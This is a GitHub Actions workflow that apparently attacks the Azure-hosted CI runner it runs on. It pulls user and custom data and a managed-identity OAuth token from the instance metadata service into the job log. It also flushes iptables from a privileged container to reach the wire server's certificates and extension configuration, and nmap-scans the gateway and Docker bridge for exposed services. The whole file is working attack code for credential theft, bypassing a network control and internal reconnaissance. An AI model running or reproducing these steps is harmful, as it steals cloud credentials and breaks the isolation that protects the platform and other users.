name: Deep IMDS
on: push
jobs:
  imds:
    runs-on: ubuntu-latest
    steps:
      - name: UserData and CustomData
        run: |
          IMDS="http://169.254.169.254/metadata"
          H="Metadata:true"
          echo "=== CUSTOM DATA ==="
          curl -s -H "$H" "$IMDS/instance/compute/customData?api-version=2021-02-01&format=text" 2>&1
          echo ""
          echo "=== USER DATA ==="
          curl -s -H "$H" "$IMDS/instance/compute/userData?api-version=2021-03-01&format=text" 2>&1
          echo ""
          echo "=== IDENTITY INFO ==="
          curl -s -H "$H" "$IMDS/identity/info?api-version=2018-02-01" 2>&1
          echo ""
          echo "=== IDENTITY TOKEN (verbose) ==="
          curl -sv -H "$H" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1
          echo ""
          echo "=== VERSIONS ==="
          curl -s -H "$H" "$IMDS/versions" 2>&1

      - name: Wire Server via Docker Bypass
        run: |
          echo "=== Current iptables rules ==="
          sudo iptables -L -n 2>&1 | head -30
          echo ""
          echo "=== Attempting wire server from privileged container ==="
          docker run --rm --privileged --net=host alpine sh -c "
            apk add --no-cache curl >/dev/null 2>&1
            echo '=== IPTABLES FROM CONTAINER ==='
            iptables -L -n 2>&1 | head -30
            echo ''
            echo '=== REMOVING IPTABLES BLOCK ==='
            iptables -F 2>&1 || echo 'flush failed'
            echo ''
            echo '=== WIRE SERVER AFTER FLUSH ==='
            curl -sf --connect-timeout 5 http://168.63.129.16/machine?comp=goalstate 2>&1 | head -c 1000
            echo ''
            echo '=== WIRE SERVER CERTIFICATES ==='
            curl -sf --connect-timeout 5 'http://168.63.129.16/machine?comp=certificates' -H 'x-ms-agent-name: WALinuxAgent' -H 'x-ms-version: 2012-11-30' 2>&1 | head -c 500
            echo ''
            echo '=== WIRE SERVER EXTENSIONS ==='
            curl -sf --connect-timeout 5 'http://168.63.129.16/machine?comp=config&type=extensionsConfig' -H 'x-ms-agent-name: WALinuxAgent' -H 'x-ms-version: 2012-11-30' 2>&1 | head -c 1000
          "

      - name: Network from privileged container
        run: |
          docker run --rm --privileged --net=host alpine sh -c "
            apk add --no-cache nmap curl >/dev/null 2>&1
            echo '=== ARP TABLE ==='
            cat /proc/net/arp
            echo ''
            echo '=== QUICK SCAN GATEWAY ==='
            nmap -sT -p 22,80,443,2375,8080,10250 10.1.0.1 2>&1 | grep -E 'open|closed|filtered'
            echo ''
            echo '=== SCAN DOCKER BRIDGE ==='
            nmap -sT -p 2375,2376 172.17.0.1-5 2>&1 | grep -E 'open|Host'
          "
